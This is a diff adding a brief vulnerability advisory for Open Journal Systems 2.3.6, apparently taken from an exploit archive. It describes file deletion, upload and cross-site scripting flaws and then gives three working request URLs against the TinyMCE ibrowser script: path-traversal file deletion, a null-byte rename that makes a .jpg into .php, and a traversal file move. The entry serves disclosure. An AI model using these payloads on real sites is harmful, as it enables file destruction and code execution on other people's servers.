@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/52666/info
+    
+Open Journal Systems is prone to following multiple vulnerabilities because the software fails to sufficiently sanitize user-supplied input:
+    
+1. An arbitrary-file-deletion vulnerability
+2. A security vulnerability
+3. An arbitrary-file-upload vulnerability
+4. Multiple cross-site scripting vulnerabilities
+    
+An attacker may leverage these issues to execute arbitrary script code, upload arbitrary files, and execute arbitrary code with administrative privileges. These issues may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+    
+Open Journal Systems 2.3.6 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/lib/pkp/lib/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/rfiles.php?lang=en& param=delete|/../../../../../../../../../../../../../../../../../../../temp/file_to_delete
+
+Arbitrary File Renaming:
+http://www.example.com/lib/pkp/lib/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/rfiles.php?lang=en& param=rename|file.jpg|file.php%00.jpg
+http://www.example.com/lib/pkp/lib/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/rfiles.php?lang=en& param=rename|/../../../../../../../../../../../../../../../../../../../tmp/file_to_move|1x.jpg
